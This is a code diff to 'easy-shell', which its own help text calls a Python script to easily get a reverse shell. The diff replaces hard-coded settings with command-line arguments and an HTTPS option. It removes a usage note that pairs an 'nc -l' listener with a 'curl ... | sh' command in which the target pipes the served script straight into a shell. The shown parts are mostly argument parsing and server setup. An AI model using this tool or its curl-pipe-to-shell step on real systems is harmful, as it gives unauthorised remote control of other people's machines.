@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 """
 Copyright 2020 Cristian Souza
 
@@ -30,21 +31,23 @@ SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 """
 
 import ssl
+import sys
+import os.path
+import argparse
 import http.server
 import socketserver
 from urllib.parse import urlparse
 
-PORT = 8080
-DOMAIN = "http://127.0.0.1:{}".format(PORT)
+PORT = None
+DOMAIN = None
 
 HTTPS = False
-KEY_FILE = "keyfile.key"      # openssl genrsa 2048 > keyfile.key && chmod 400 keyfile.key
-CERT_FILE = "certfile.cert"   # openssl req -new -x509 -nodes -sha256 -days 365 -key keyfile.key -out certfile.cert
+KEY_FILE = "keyfile.key"
+CERT_FILE = "certfile.cert"
 
-USAGE = """# Usage
-#      Attacker:      nc -l port
-#      Target:        curl {}/ip:port | sh\n""".format(DOMAIN)
-
+def die(msg):
+    print("[Error] {}".format(msg))
+    sys.exit(1)
 
 def is_valid(host_port):
     """Checks if there are a host and a port."""
@@ -106,11 +109,32 @@ def main():
     """Main function."""
 
     handler_object = HttpRequestHandler
-    server = socketserver.TCPServer(("", PORT), handler_object)
+    server = socketserver.TCPServer(("", int(PORT)), handler_object)
     if HTTPS:
         server.socket = ssl.wrap_socket(server.socket, server_side=True,
                                         keyfile=KEY_FILE, certfile=CERT_FILE)
     server.serve_forever()
 
+def init():
+    parser = argparse.ArgumentParser(
+                        prog = 'easy-shell',
+                        description = 'A pure Python script to easily get a reverse shell.')
+
+    parser.add_argument('domain')
+    parser.add_argument('port')
+    parser.add_argument('-s', '--ssl',
+                        help="use HTTPS instead of plain HTTP",
+                        action='store_true')
+
+    args = parser.parse_args()
+
+    if args.ssl:
+        if not os.path.isfile(KEY_FILE) or not os.path.isfile(CERT_FILE):
+            die("No Certificates found")
+
+    return "http://{}:{}".format(args.domain, args.port), args.port, args.ssl
+
 if __name__ == "__main__":
+    DOMAIN, PORT, HTTPS = init()
+
     main()
